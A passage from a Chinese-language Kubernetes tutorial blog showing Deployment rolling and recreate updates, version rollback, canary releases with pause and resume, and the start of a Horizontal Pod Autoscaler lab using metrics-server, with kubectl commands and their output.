5m23s</span><br><span class="line">pc-deployment-6696798b78-jxmdq   1/1     Running   0          2m38s</span><br><span class="line">pc-deployment-6696798b78-smpvp   1/1     Running   0          5m23s</span><br><span class="line">pc-deployment-6696798b78-wvjd8   1/1     Running   0          5m23s</span><br></pre></td></tr></table></figure><p><strong>镜像更新</strong></p><p>deployment支持两种更新策略:<code>重建更新</code>和<code>滚动更新</code>,可以通过<code>strategy</code>指定策略类型,支持两个属性:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">strategy：指定新的Pod替换旧的Pod的策略，</span> <span class="string">支持两个属性：</span></span><br><span class="line">  <span class="string">type：指定策略类型，支持两种策略</span></span><br><span class="line">    <span class="string">Recreate：在创建出新的Pod之前会先杀掉所有已存在的Pod</span></span><br><span class="line">    <span class="string">RollingUpdate：滚动更新，就是杀死一部分，就启动一部分，在更新过程中，存在两个版本Pod</span></span><br><span class="line">  <span class="string">rollingUpdate：当type为RollingUpdate时生效，用于为RollingUpdate设置参数，支持两个属性：</span></span><br><span class="line">    <span class="string">maxUnavailable：用来指定在升级过程中不可用Pod的最大数量，默认为25%。</span></span><br><span class="line">    <span class="string">maxSurge：</span> <span class="string">用来指定在升级过程中可以超过期望的Pod的最大数量，默认为25%。</span></span><br></pre></td></tr></table></figure><p>重建更新</p><ol><li>编辑pc-deployment.yaml,在spec节点下添加更新策略</li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">strategy:</span> <span class="comment"># 策略</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">Recreate</span> <span class="comment"># 重建更新</span></span><br></pre></td></tr></table></figure><ol start="2"><li>创建deploy进行验证</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">变更镜像</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl set image deployment pc-deployment nginx=nginx:1.17.2 -n dev</span><br><span class="line">deployment.apps/pc-deployment image updated</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">观察升级过程</span></span><br><span class="line">[root@k8s-master01 ~]#  kubectl get pods -n dev -w</span><br><span class="line">NAME                             READY   STATUS    RESTARTS   AGE</span><br><span class="line">pc-deployment-5d89bdfbf9-65qcw   1/1     Running   0          31s</span><br><span class="line">pc-deployment-5d89bdfbf9-w5nzv   1/1     Running   0          31s</span><br><span class="line">pc-deployment-5d89bdfbf9-xpt7w   1/1     Running   0          31s</span><br><span class="line"></span><br><span class="line">pc-deployment-5d89bdfbf9-xpt7w   1/1     Terminating   0          41s</span><br><span class="line">pc-deployment-5d89bdfbf9-65qcw   1/1     Terminating   0          41s</span><br><span class="line">pc-deployment-5d89bdfbf9-w5nzv   1/1     Terminating   0          41s</span><br><span class="line"></span><br><span class="line">pc-deployment-675d469f8b-grn8z   0/1     Pending       0          0s</span><br><span class="line">pc-deployment-675d469f8b-hbl4v   0/1     Pending       0          0s</span><br><span class="line">pc-deployment-675d469f8b-67nz2   0/1     Pending       0          0s</span><br><span class="line"></span><br><span class="line">pc-deployment-675d469f8b-grn8z   0/1     ContainerCreating   0          0s</span><br><span class="line">pc-deployment-675d469f8b-hbl4v   0/1     ContainerCreating   0          0s</span><br><span class="line">pc-deployment-675d469f8b-67nz2   0/1     ContainerCreating   0          0s</span><br><span class="line"></span><br><span class="line">pc-deployment-675d469f8b-grn8z   1/1     Running             0          1s</span><br><span class="line">pc-deployment-675d469f8b-67nz2   1/1     Running             0          1s</span><br><span class="line">pc-deployment-675d469f8b-hbl4v   1/1     Running             0          2s</span><br></pre></td></tr></table></figure><p>滚动更新</p><ol><li>编辑pc-deployment.yaml,在spec节点下添加更新策略</li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">strategy:</span> <span class="comment"># 策略</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">RollingUpdate</span> <span class="comment"># 滚动更新策略</span></span><br><span class="line">    <span class="attr">rollingUpdate:</span></span><br><span class="line">      <span class="attr">maxSurge:</span> <span class="number">25</span><span class="string">%</span> </span><br><span class="line">      <span class="attr">maxUnavailable:</span> <span class="number">25</span><span class="string">%</span></span><br></pre></td></tr></table></figure><ol start="2"><li>创建deploy进行验证</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">变更镜像</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl set image deployment pc-deployment nginx=nginx:1.17.3 -n dev </span><br><span class="line">deployment.apps/pc-deployment image updated</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">观察升级过程</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods -n dev -w</span><br><span class="line">NAME                           READY   STATUS    RESTARTS   AGE</span><br><span class="line">pc-deployment-c848d767-8rbzt   1/1     Running   0          31m</span><br><span class="line">pc-deployment-c848d767-h4p68   1/1     Running   0          31m</span><br><span class="line">pc-deployment-c848d767-hlmz4   1/1     Running   0          31m</span><br><span class="line">pc-deployment-c848d767-rrqcn   1/1     Running   0          31m</span><br><span class="line"></span><br><span class="line">pc-deployment-966bf7f44-226rx   0/1     Pending             0          0s</span><br><span class="line">pc-deployment-966bf7f44-226rx   0/1     ContainerCreating   0          0s</span><br><span class="line">pc-deployment-966bf7f44-226rx   1/1     Running             0          1s</span><br><span class="line">pc-deployment-c848d767-h4p68    0/1     Terminating         0          34m</span><br><span class="line"></span><br><span class="line">pc-deployment-966bf7f44-cnd44   0/1     Pending             0          0s</span><br><span class="line">pc-deployment-966bf7f44-cnd44   0/1     ContainerCreating   0          0s</span><br><span class="line">pc-deployment-966bf7f44-cnd44   1/1     Running             0          2s</span><br><span class="line">pc-deployment-c848d767-hlmz4    0/1     Terminating         0          34m</span><br><span class="line"></span><br><span class="line">pc-deployment-966bf7f44-px48p   0/1     Pending             0          0s</span><br><span class="line">pc-deployment-966bf7f44-px48p   0/1     ContainerCreating   0          0s</span><br><span class="line">pc-deployment-966bf7f44-px48p   1/1     Running             0          0s</span><br><span class="line">pc-deployment-c848d767-8rbzt    0/1     Terminating         0          34m</span><br><span class="line"></span><br><span class="line">pc-deployment-966bf7f44-dkmqp   0/1     Pending             0          0s</span><br><span class="line">pc-deployment-966bf7f44-dkmqp   0/1     ContainerCreating   0          0s</span><br><span class="line">pc-deployment-966bf7f44-dkmqp   1/1     Running             0          2s</span><br><span class="line">pc-deployment-c848d767-rrqcn    0/1     Terminating         0          34m</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">至此，新版本的pod创建完毕，就版本的pod销毁完毕</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">中间过程是滚动进行的，也就是边销毁边创建</span></span><br></pre></td></tr></table></figure><p>滚动更新的过程：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200416140251491.png" alt="img"></p><p>镜像更新中rs的变化</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看rs,发现原来的rs的依旧存在，只是pod数量变为了0，而后又新产生了一个rs，pod数量为4</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">其实这就是deployment能够进行版本回退的奥妙所在，后面会详细解释</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get rs -n dev</span><br><span class="line">NAME                       DESIRED   CURRENT   READY   AGE</span><br><span class="line">pc-deployment-6696798b78   0         0         0       7m37s</span><br><span class="line">pc-deployment-6696798b11   0         0         0       5m37s</span><br><span class="line">pc-deployment-c848d76789   4         4         4       72s</span><br></pre></td></tr></table></figure><p><strong>版本回退</strong></p><p>deployment支持版本升级过程中的暂停、继续功能以及版本回退等诸多功能，下面具体来看.</p><p>kubectl rollout： 版本升级相关功能，支持下面的选项：</p><ul><li>status 显示当前升级状态</li><li>history 显示 升级历史记录</li><li>pause 暂停版本升级过程</li><li>resume 继续已经暂停的版本升级过程</li><li>restart 重启版本升级过程</li><li>undo 回滚到上一级版本（可以使用–to-revision回滚到指定版本）</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前升级版本的状态</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl rollout status deploy pc-deployment -n dev</span><br><span class="line">deployment &quot;pc-deployment&quot; successfully rolled out</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看升级历史记录</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl rollout history deploy pc-deployment -n dev</span><br><span class="line">deployment.apps/pc-deployment</span><br><span class="line">REVISION  CHANGE-CAUSE</span><br><span class="line">1         kubectl create --filename=pc-deployment.yaml --record=true</span><br><span class="line">2         kubectl create --filename=pc-deployment.yaml --record=true</span><br><span class="line">3         kubectl create --filename=pc-deployment.yaml --record=true</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以发现有三次版本记录，说明完成过两次升级</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">版本回滚</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里直接使用--to-revision=1回滚到了1版本， 如果省略这个选项，就是回退到上个版本，就是2版本</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl rollout undo deployment pc-deployment --to-revision=1 -n dev</span><br><span class="line">deployment.apps/pc-deployment rolled back</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看发现，通过nginx镜像版本可以发现到了第一版</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get deploy -n dev -o wide</span><br><span class="line">NAME            READY   UP-TO-DATE   AVAILABLE   AGE   CONTAINERS   IMAGES         </span><br><span class="line">pc-deployment   4/4     4            4           74m   nginx        nginx:1.17.1   </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看rs，发现第一个rs中有4个pod运行，后面两个版本的rs中pod为运行</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">其实deployment之所以可是实现版本的回滚，就是通过记录下历史rs来实现的，</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">一旦想回滚到哪个版本，只需要将当前版本pod数量降为0，然后将回滚版本的pod提升为目标数量就可以了</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get rs -n dev</span><br><span class="line">NAME                       DESIRED   CURRENT   READY   AGE</span><br><span class="line">pc-deployment-6696798b78   4         4         4       78m</span><br><span class="line">pc-deployment-966bf7f44    0         0         0       37m</span><br><span class="line">pc-deployment-c848d767     0         0         0       71m</span><br></pre></td></tr></table></figure><p><strong>金丝雀发布</strong></p><p>Deployment控制器支持控制更新过程中的控制，如“暂停(pause)”或“继续(resume)”更新操作。</p><p>比如有一批新的Pod资源创建完成后立即暂停更新过程，此时，仅存在一部分新版本的应用，主体部分还是旧的版本。然后，再筛选一小部分的用户请求路由到新版本的Pod应用，继续观察能否稳定地按期望的方式运行。确定没问题之后再继续完成余下的Pod资源滚动更新，否则立即回滚更新操作。这就是所谓的金丝雀发布。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新deployment的版本，并配置暂停deployment</span></span><br><span class="line">[root@k8s-master01 ~]#  kubectl set image deploy pc-deployment nginx=nginx:1.17.4 -n dev &amp;&amp; kubectl rollout pause deployment pc-deployment  -n dev</span><br><span class="line">deployment.apps/pc-deployment image updated</span><br><span class="line">deployment.apps/pc-deployment paused</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">观察更新状态</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl rollout status deploy pc-deployment -n dev　</span><br><span class="line">Waiting for deployment &quot;pc-deployment&quot; rollout to finish: 2 out of 4 new replicas have been updated...</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">监控更新的过程，可以看到已经新增了一个资源，但是并未按照预期的状态去删除一个旧的资源，就是因为使用了pause暂停命令</span></span><br><span class="line"></span><br><span class="line">[root@k8s-master01 ~]# kubectl get rs -n dev -o wide</span><br><span class="line">NAME                       DESIRED   CURRENT   READY   AGE     CONTAINERS   IMAGES         </span><br><span class="line">pc-deployment-5d89bdfbf9   3         3         3       19m     nginx        nginx:1.17.1   </span><br><span class="line">pc-deployment-675d469f8b   0         0         0       14m     nginx        nginx:1.17.2   </span><br><span class="line">pc-deployment-6c9f56fcfb   2         2         2       3m16s   nginx        nginx:1.17.4   </span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods -n dev</span><br><span class="line">NAME                             READY   STATUS    RESTARTS   AGE</span><br><span class="line">pc-deployment-5d89bdfbf9-rj8sq   1/1     Running   0          7m33s</span><br><span class="line">pc-deployment-5d89bdfbf9-ttwgg   1/1     Running   0          7m35s</span><br><span class="line">pc-deployment-5d89bdfbf9-v4wvc   1/1     Running   0          7m34s</span><br><span class="line">pc-deployment-6c9f56fcfb-996rt   1/1     Running   0          3m31s</span><br><span class="line">pc-deployment-6c9f56fcfb-j2gtj   1/1     Running   0          3m31s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">确保更新的pod没问题了，继续更新</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl rollout resume deploy pc-deployment -n dev</span><br><span class="line">deployment.apps/pc-deployment resumed</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看最后的更新情况</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get rs -n dev -o wide</span><br><span class="line">NAME                       DESIRED   CURRENT   READY   AGE     CONTAINERS   IMAGES         </span><br><span class="line">pc-deployment-5d89bdfbf9   0         0         0       21m     nginx        nginx:1.17.1   </span><br><span class="line">pc-deployment-675d469f8b   0         0         0       16m     nginx        nginx:1.17.2   </span><br><span class="line">pc-deployment-6c9f56fcfb   4         4         4       5m11s   nginx        nginx:1.17.4   </span><br><span class="line"></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods -n dev</span><br><span class="line">NAME                             READY   STATUS    RESTARTS   AGE</span><br><span class="line">pc-deployment-6c9f56fcfb-7bfwh   1/1     Running   0          37s</span><br><span class="line">pc-deployment-6c9f56fcfb-996rt   1/1     Running   0          5m27s</span><br><span class="line">pc-deployment-6c9f56fcfb-j2gtj   1/1     Running   0          5m27s</span><br><span class="line">pc-deployment-6c9f56fcfb-rf84v   1/1     Running   0          37s</span><br></pre></td></tr></table></figure><p><strong>删除Deployment</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除deployment，其下的rs和pod也将被删除</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl delete -f pc-deployment.yaml</span><br><span class="line">deployment.apps &quot;pc-deployment&quot; deleted</span><br></pre></td></tr></table></figure><h2 id="6-4-Horizontal-Pod-Autoscaler-HPA"><a href="#6-4-Horizontal-Pod-Autoscaler-HPA" class="headerlink" title="6.4 Horizontal Pod Autoscaler(HPA)"></a>6.4 Horizontal Pod Autoscaler(HPA)</h2><p>在前面的课程中，我们已经可以实现通过手工执行<code>kubectl scale</code>命令实现Pod扩容或缩容，但是这显然不符合Kubernetes的定位目标–自动化、智能化。 Kubernetes期望可以实现通过监测Pod的使用情况，实现pod数量的自动调整，于是就产生了Horizontal Pod Autoscaler（HPA）这种控制器。</p><p>HPA可以获取每个Pod利用率，然后和HPA中定义的指标进行对比，同时计算出需要伸缩的具体值，最后实现Pod的数量的调整。其实HPA与之前的Deployment一样，也属于一种Kubernetes资源对象，它通过追踪分析RC控制的所有目标Pod的负载变化情况，来确定是否需要针对性地调整目标Pod的副本数，这是HPA的实现原理。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200608155858271.png" alt="img"></p><p>接下来，我们来做一个实验</p><p><strong>1 安装metrics-server</strong></p><p>metrics-server可以用来收集集群中的资源使用情况</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装git</span></span><br><span class="line">[root@k8s-master01 ~]# yum install git -y</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取metrics-server, 注意使用的版本</span></span><br><span class="line">[root@k8s-master01 ~]# git clone -b v0.3.6 https://github.com/kubernetes-incubator/metrics-server</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改deployment, 注意修改的是镜像和初始化参数</span></span><br><span class="line">[root@k8s-master01 ~]# cd /root/metrics-server/deploy/1.8+/</span><br><span class="line">[root@k8s-master01 1.8+]# vim metrics-server-deployment.yaml</span><br><span class="line">按图中添加下面选项</span><br><span class="line">hostNetwork: true</span><br><span class="line">image: registry.cn-hangzhou.aliyuncs.com/google_containers/metrics-server-amd64:v0.3.6</span><br><span class="line">args:</span><br><span class="line">- --kubelet-insecure-tls</span><br><span class="line">- --kubelet-preferred-address-types=InternalIP,Hostname,InternalDNS,ExternalDNS,ExternalIP</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200608163326496.png" alt="image-20200608163326496"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装metrics-server</span></span><br><span class="line">[root@k8s-master01 1.8+]# kubectl apply -f ./</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pod运行情况</span></span><br><span class="line">[root@k8s-master01 1.8+]# kubectl get pod -n kube-system</span><br><span class="line">metrics-server-6b976979db-2xwbj   1/1     Running   0          90s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用kubectl top node 查看资源使用情况</span></span><br><span class="line">[root@k8s-master01 1.8+]# kubectl top node</span><br><span class="line">NAME           CPU(cores)   CPU%   MEMORY(bytes)   MEMORY%</span><br><span class="line">k8s-master01   289m         14%    1582Mi          54%       </span><br><span class="line">k8s-node01     81m          4%     1195Mi          40%       </span><br><span class="line">k8s-node02     72m          3%     1211Mi          41%  </span><br><span class="line">[root@k8s-master01 1.8+]# kubectl top pod -n kube-system</span><br><span class="line">NAME                              CPU(cores)   MEMORY(bytes)</span><br><span class="line">coredns-6955765f44-7ptsb          3m           9Mi</span><br><span class="line">coredns-6955765f44-vcwr5          3m           8Mi</span><br><span class="line">etcd-master                       14m          145Mi</span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">至此,metrics-server安装完成</span></span><br></pre></td></tr></table></figure><p><strong>2 准备deployment和servie</strong></p><p>创建pc-hpa-pod.yaml文件，内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">strategy:</span> <span class="comment"># 策略</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">RollingUpdate</span> <span class="comment"># 滚动更新策略</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nginx-pod</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx-pod</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">        <span class="attr">resources:</span> <span class="comment"># 资源配额</span></span><br><span class="line">          <span class="attr">limits:</span>  <span class="comment"># 限制资源（上限）</span></span><br><span class="line">            <span class="attr">cpu:</span> <span class="string">&quot;1&quot;</span> <span class="comment"># CPU限制，单位是core数</span></span><br><span class="line">          <span class="attr">requests:</span> <span class="comment"># 请求资源（下限）</span></span><br><span class="line">            <span class="attr">cpu:</span> <span class="string">&quot;100m&quot;</span>  <span class="comment"># CPU限制，单位是core数</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建service</span></span><br><span class="line">[root@k8s-master01 1.8+]# kubectl expose deployment nginx --type=NodePort --port=80 -n dev</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看</span></span><br><span class="line">[root@k8s-master01 1.8+]# kubectl get deployment,pod,svc -n dev</span><br><span class="line">NAME                    READY   UP-TO-DATE   AVAILABLE   AGE</span><br><span class="line">deployment.apps/nginx   1/1     1            1           47s</span><br><span class="line"></span><br><span class="line">NAME                         READY   STATUS    RESTARTS   AGE</span><br><span class="line">pod/nginx-7df9756ccc-bh8dr   1/1     Running   0          47s</span><br><span class="line"></span><br><span class="line">NAME            TYPE       CLUSTER-IP      EXTERNAL-IP   PORT(S)        AGE</span><br><span class="line">service/nginx   NodePort   10.101.18.29   &lt;none&gt;        80:31830/TCP   35s</span><br></pre></td></tr></table></figure><p><strong>3 部署HPA</strong></p><p>创建pc-hpa.yaml文件，内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">autoscaling/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">HorizontalPodAutoscaler</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pc-hpa</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">minReplicas:</span> <span class="number">1</span>  <span class="comment">#最小pod数量</span></span><br><span class="line">  <span class="attr">maxReplicas:</span> <span class="number">10</span> <span class="comment">#最大pod数量</span></span><br><span class="line">  <span class="attr">targetCPUUtilizationPercentage:</span> <span class="number">3</span> <span class="comment"># CPU使用率指标</span></span><br><span class="line">  <span class="attr">scaleTargetRef:</span>   <span class="comment"># 指定要控制的nginx信息</span></span><br><span class="line">    <span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line">    <span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nginx</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建hpa</span></span><br><span class="line">[root@k8s-master01 1.8+]# kubectl create -f pc-hpa.yaml</span><br><span class="line">horizontalpodautoscaler.autoscaling/pc-hpa created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看hpa</span></span><br><span class="line">    [root@k8s-master01 1.8+]# kubectl get hpa -n dev</span><br><span class="line">NAME     REFERENCE          TARGETS   MINPODS   MAXPODS   REPLICAS   AGE</span><br><span class="line">pc-hpa   Deployment/nginx 